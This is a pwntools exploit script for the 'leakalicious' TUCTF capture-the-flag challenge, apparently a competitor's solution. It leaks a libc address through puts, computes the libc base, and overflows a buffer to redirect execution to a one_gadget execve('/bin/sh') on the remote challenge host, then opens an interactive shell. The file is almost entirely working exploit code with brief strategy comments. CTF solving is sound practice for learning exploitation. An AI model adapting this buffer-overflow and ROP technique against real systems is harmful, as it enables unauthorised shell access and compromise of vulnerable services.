#!/usr/bin/python3

from pwn import *

"""
Constraints:
    ASLR
    PIE
    NX

Strategy:
    1. leak .text section address because of PIE
    2. compute .text section addresses to ROP to puts_plt()
    3. leak libc address of printf_got_plt 
    4. leak libc address of read_got_plt

    5. use https://libc.blukat.me/ to find version of libc
    12 least significant bits are unchanged because randomization usually works on page size level.
    querying
    puts() ca0
    matches libc6_2.23-0ubuntu11_i386 

==> 6. build final exploit with known libc version
    all offsets based on libc6_2.23-0ubuntu10_i386.so
"""

context.log_level = 'debug'

"""
0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL
"""
def generate_payload(eip):
    payload = b""
    payload += b"A"*44
    payload += p32(eip)
    payload += b"\x00"*50
    return payload

def main():
    #target = process("./leakalicious")
    target = remote("chal.tuctf.com", 30505)
    
    prompt = target.recvuntil(b"> ")
    fmt_str = b"A"*31

    # Leak 0xf7e4b160 <puts>:      0x57e58955
    target.sendline(fmt_str)
    leaked_puts = u32(target.recvuntil(b"> ").split(b"\n")[1].rstrip(b"?\n"))
    print("puts libc =", hex(leaked_puts))

    libc_base  = leaked_puts - 0x5fca0 # remote offset
    one_gadget = libc_base + 0x3ac5e 

    payload = generate_payload(one_gadget)
    target.sendline(payload)
    target.recvuntil(b"> ")

    target.interactive()

main()
